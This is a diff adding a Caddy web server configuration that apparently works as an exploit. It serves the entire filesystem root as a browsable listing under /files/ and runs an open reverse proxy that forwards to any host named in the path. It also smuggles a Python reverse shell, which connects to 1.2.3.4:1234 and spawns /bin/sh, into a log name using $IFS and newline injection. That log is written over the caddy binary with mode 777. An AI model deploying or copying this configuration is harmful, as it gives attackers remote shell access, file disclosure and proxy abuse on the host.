@@ -1,0 +1,46 @@
+{
+	debug
+}
+
+:80 {
+	handle_path / {
+		root * ./
+		file_server
+	}
+
+	handle_path /files/* {
+		root * /
+		file_server browse {
+			root /
+		}
+	}
+
+	handle_path /log {
+		respond 'kek'
+	}
+
+	log kek\n\npython$IFS-c$IFS'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("1.2.3.4",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'\n\nkek {
+		format filter {
+			wrap console
+		}
+
+		output file /usr/local/sbin/caddy {
+			mode 777
+		}
+	}
+
+	handle_path /* {
+		@stripHostPort path_regexp stripHostPort ^\/(?:[a-z]+:\/\/)?([^\/]+?)(?::(\d+))?(\/.*)?$
+
+		rewrite @stripHostPort {http.regexp.stripHostPort.3}
+
+		map {http.regexp.stripHostPort.2} {proxyHostname} {
+			80 {http.regexp.stripHostPort.1}
+			default {http.regexp.stripHostPort.1}:{http.regexp.stripHostPort.2}
+		}
+
+		reverse_proxy {http.regexp.stripHostPort.1}:{http.regexp.stripHostPort.2} {
+			header_up Host {proxyHostname}
+		}
+	}
+}
